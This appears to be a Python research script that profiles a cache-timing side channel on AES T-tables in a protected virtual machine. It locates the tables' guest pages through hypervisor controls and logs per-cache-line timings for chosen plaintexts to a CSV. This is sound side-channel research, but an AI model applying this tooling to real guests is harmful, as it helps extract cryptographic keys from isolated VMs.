#!/usr/bin/env python3
from __future__ import annotations

import csv
import json
import os
import random
from pathlib import Path

import run_53 as core


def choose_target_page(
    vm_ctl: core.NptCtlClient,
    args,
    outdir: Path,
    te0_inpage_offset: int,
) -> tuple[int, int]:
    del vm_ctl, outdir
    force_te0 = str(getattr(args, "force_te0_gpa", "") or "").strip()
    if force_te0:
        te0_gpa = core.parse_u64(force_te0)
        return te0_gpa & ~(core.PAGE_SZ - 1), te0_gpa
    force_page = str(getattr(args, "force_te_page_gpa", "") or "").strip()
    if force_page:
        page = core.parse_u64(force_page) & ~(core.PAGE_SZ - 1)
        return page, page + int(te0_inpage_offset)
    if str(getattr(args, "suspected_range_json", "") or "").strip():
        obj = json.loads(Path(args.suspected_range_json).read_text())
        cluster_pages = obj.get("cluster_pages") or []
        if cluster_pages:
            page = core.parse_u64(str(cluster_pages[0])) & ~(core.PAGE_SZ - 1)
            return page, page + int(te0_inpage_offset)
    start, _end, _off = core.load_scan_range(args)
    page = int(start) & ~(core.PAGE_SZ - 1)
    return page, page + int(te0_inpage_offset)


def compute_entry_layout(te0_gpa: int, byte_pos: int) -> list[dict[str, int]]:
    table_idx = int(byte_pos) % core.TABLE_COUNT
    rows: list[dict[str, int]] = []
    for entry in range(256):
        byte_off = table_idx * core.TABLE_BYTES + entry * 4
        gpa = te0_gpa + byte_off
        page = gpa & ~(core.PAGE_SZ - 1)
        line = (gpa - core.te_cl_base_gpa(te0_gpa)) // core.LINE_SZ
        rows.append(
            {
                "entry": int(entry),
                "gpa": int(gpa),
                "page": int(page),
                "line": int(line),
            }
        )
    return rows


def find_page_boundary(layout: list[dict[str, int]]) -> dict[str, int]:
    if not layout:
        return {"entry_before": -1, "entry_after": -1, "line_before": -1, "line_after": -1}
    prev = layout[0]
    for cur in layout[1:]:
        if int(cur["page"]) != int(prev["page"]):
            return {
                "entry_before": int(prev["entry"]),
                "entry_after": int(cur["entry"]),
                "line_before": int(prev["line"]),
                "line_after": int(cur["line"]),
                "page_before": int(prev["page"]),
                "page_after": int(cur["page"]),
            }
        prev = cur
    last = layout[-1]
    return {
        "entry_before": int(last["entry"]),
        "entry_after": int(last["entry"]),
        "line_before": int(last["line"]),
        "line_after": int(last["line"]),
        "page_before": int(last["page"]),
        "page_after": int(last["page"]),
    }


def _rank_table_rows(
    line_rows: list[dict[str, float | int]],
    table_idx: int,
    noise_lines: set[int],
) -> list[dict[str, float | int]]:
    ranked: list[dict[str, float | int]] = []
    t_start, t_end = core.table_line_range(0, table_idx)
    del t_start, t_end
    for row in line_rows:
        line = int(row["line"])
        if line in noise_lines:
            continue
        if table_idx not in core.row_memberships(row):
            continue
        ranked.append(row)
    ranked.sort(key=core.line_score, reverse=True)
    return ranked


def select_boundary_lines(
    line_rows: list[dict[str, float | int]],
    te0_gpa: int,
    table_idx: int,
    boundary: dict[str, int],
    noise_lines: set[int],
    lines_per_side: int,
    line_window: int,
) -> tuple[dict[str, list[int]], list[dict[str, float | int]]]:
    ranked_rows = _rank_table_rows(line_rows, table_idx, noise_lines)
    before_line = int(boundary.get("line_before", -1))
    after_line = int(boundary.get("line_after", -1))
    before_candidates: list[tuple[float, int]] = []
    after_candidates: list[tuple[float, int]] = []
    t_start, t_end = core.table_line_range(te0_gpa, table_idx)
    for row in ranked_rows:
        line = int(row["line"])
        if line < t_start or line > t_end:
            continue
        score = float(core.line_score(row))
        if before_line - int(line_window) <= line <= before_line:
            before_candidates.append((score, line))
        if after_line <= line <= after_line + int(line_window):
            after_candidates.append((score, line))
    if not before_candidates:
        for line in range(max(t_start, before_line - int(line_window)), min(t_end, before_line) + 1):
            if line not in noise_lines:
                before_candidates.append((0.0, line))
    if not after_candidates:
        for line in range(max(t_start, after_line), min(t_end, after_line + int(line_window)) + 1):
            if line not in noise_lines:
                after_candidates.append((0.0, line))
    before_lines = [line for _score, line in sorted(before_candidates, key=lambda x: (x[0], -abs(x[1] - before_line)), reverse=True)[: max(1, int(lines_per_side))]]
    after_lines = [line for _score, line in sorted(after_candidates, key=lambda x: (x[0], -abs(x[1] - after_line)), reverse=True)[: max(1, int(lines_per_side))]]
    return {"before": before_lines, "after": after_lines}, ranked_rows


def select_template_feature_lines(
    line_rows: list[dict[str, float | int]],
    table_idx: int,
    noise_lines: set[int],
    topk: int,
    selected_lines: dict[str, list[int]],
) -> list[int]:
    ranked_rows = _rank_table_rows(line_rows, table_idx, noise_lines)
    out: list[int] = []
    for line in selected_lines.get("before", []):
        if int(line) not in out:
            out.append(int(line))
    for line in selected_lines.get("after", []):
        if int(line) not in out:
            out.append(int(line))
    for row in ranked_rows:
        line = int(row["line"])
        if line not in out:
            out.append(line)
        if len(out) >= max(len(out), int(topk)):
            # keep scanning until we have selected lines plus top-k total lines
            if len(out) >= len(set(selected_lines.get("before", []) + selected_lines.get("after", []))) + int(topk):
                break
    return sorted(set(out))


def build_role_feature_specs(
    line_rows: list[dict[str, float | int]],
    table_idx: int,
    noise_lines: set[int],
    selected_lines: dict[str, list[int]],
    topk: int,
) -> list[dict[str, int | str]]:
    ranked_rows = _rank_table_rows(line_rows, table_idx, noise_lines)
    used: set[int] = set()
    specs: list[dict[str, int | str]] = []
    for idx, line in enumerate(selected_lines.get("before", [])):
        specs.append({"name": f"before_{idx}", "line": int(line)})
        used.add(int(line))
    for idx, line in enumerate(selected_lines.get("after", [])):
        specs.append({"name": f"after_{idx}", "line": int(line)})
        used.add(int(line))
    top_idx = 0
    for row in ranked_rows:
        line = int(row["line"])
        if line in used:
            continue
        specs.append({"name": f"table_top_{top_idx}", "line": line})
        used.add(line)
        top_idx += 1
        if top_idx >= int(topk):
            break
    return specs


def parse_entry_spec(raw: str, profile_entries=None, target_entries=None) -> list[int]:
    del profile_entries, target_entries
    s = str(raw or "").strip().lower()
    if not s or s == "all":
        return list(range(256))
    vals: list[int] = []
    for tok in str(raw).split(","):
        tok = tok.strip()
        if not tok:
            continue
        if "-" in tok:
            a_s, b_s = tok.split("-", 1)
            a = int(a_s, 0)
            b = int(b_s, 0)
            lo, hi = sorted((a, b))
            vals.extend(range(lo, hi + 1))
        else:
            vals.append(int(tok, 0))
    return sorted(set(v for v in vals if 0 <= v <= 255))


def _make_plaintext_for_entry(byte_pos: int, entry: int, fixed_rest_bytes: bool) -> bytes:
    if fixed_rest_bytes:
        pt = bytearray(16)
    else:
        pt = bytearray(os.urandom(16))
    pt[byte_pos] = int(entry) ^ int(core.TRUE_AES_KEY[byte_pos])
    return bytes(pt)


def collect_observations(
    vm_ctl: core.NptCtlClient,
    te0_gpa: int,
    args,
    byte_pos: int,
    boundary: dict[str, int],
    entry_boundary: int,
    selected_lines: dict[str, list[int]],
    feature_lines: list[int],
    target_entries: list[int],
    samples_per_entry: int,
    out_csv: Path,
    collect_cont_features: bool = True,
    cont_repeats: int = 16,
) -> list[dict[str, object]]:
    lines_all = sorted(set(int(x) for x in feature_lines))
    observations: list[dict[str, object]] = []
    with out_csv.open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(
            [
                "sample_id",
                "pt_hex",
                "pt_byte",
                "entry",
                "true_side",
                "before_score",
                "after_score",
                "after_minus_before",
                "before_score_cont",
                "after_score_cont",
                "after_minus_before_cont",
                "pred_side",
                "line_scores_json",
                "line_scores_cont_json",
                "line_scores_cont_burst_json",
            ]
        )
        sample_id = 0
        for entry in target_entries:
            for _ in range(max(1, int(samples_per_entry))):
                pt = _make_plaintext_for_entry(int(byte_pos), int(entry), bool(getattr(args, "fixed_rest_bytes", True)))
                sync_cycles_map = core.sync_measure_lines_grouped(
                    vm_ctl,
                    args,
                    te0_gpa,
                    pt,
                    core.KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE,
                    lines_all,
                    repeats=max(1, int(getattr(args, "aes_sync_phase1_repeats", 1))),
                )
                line_scores = {int(k): int(v) for k, v in sync_cycles_map.items()}
                before_vals = [int(line_scores.get(line, 0)) for line in selected_lines["before"]]
                after_vals = [int(line_scores.get(line, 0)) for line in selected_lines["after"]]
                before_score = float(max(before_vals)) if before_vals else 0.0
                after_score = float(max(after_vals)) if after_vals else 0.0
                bias = float(after_score - before_score)

                line_scores_cont_burst: dict[int, list[int]] = {}
                if collect_cont_features:
                    for _rep in range(max(1, int(cont_repeats))):
                        burst_map = core.sync_measure_lines_grouped(
                            vm_ctl,
                            args,
                            te0_gpa,
                            pt,
                            core.KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE,
                            lines_all,
                            repeats=1,
                        )
                        for line in lines_all:
                            line_scores_cont_burst.setdefault(int(line), []).append(int(burst_map.get(line, 0)))

                line_scores_cont = {
                    int(line): (max(vals) if vals else 0)
                    for line, vals in line_scores_cont_burst.items()
                }
                before_vals_cont = [int(line_scores_cont.get(line, 0)) for line in selected_lines["before"]]
                after_vals_cont = [int(line_scores_cont.get(line, 0)) for line in selected_lines["after"]]
                before_score_cont = float(max(before_vals_cont)) if before_vals_cont else 0.0
                after_score_cont = float(max(after_vals_cont)) if after_vals_cont else 0.0
                bias_cont = float(after_score_cont - before_score_cont)
                true_side = 0 if int(entry) <= int(entry_boundary) else 1
                pred_side = 1 if bias_cont >= 0.0 else 0
                wr.writerow(
                    [
                        sample_id,
                        pt.hex(),
                        int(pt[int(byte_pos)]),
                        int(entry),
                        int(true_side),
                        f"{before_score:.3f}",
                        f"{after_score:.3f}",
                        f"{bias:.3f}",
                        f"{before_score_cont:.3f}",
                        f"{after_score_cont:.3f}",
                        f"{bias_cont:.3f}",
                        int(pred_side),
                        json.dumps(line_scores, sort_keys=True),
                        json.dumps(line_scores_cont, sort_keys=True),
                        json.dumps({int(k): [int(x) for x in v] for k, v in line_scores_cont_burst.items()}, sort_keys=True),
                    ]
                )
                observations.append(
                    {
                        "sample_id": int(sample_id),
                        "entry": int(entry),
                        "pt": pt,
                        "line_scores": line_scores,
                        "line_scores_cont": line_scores_cont,
                    }
                )
                sample_id += 1
    return observations
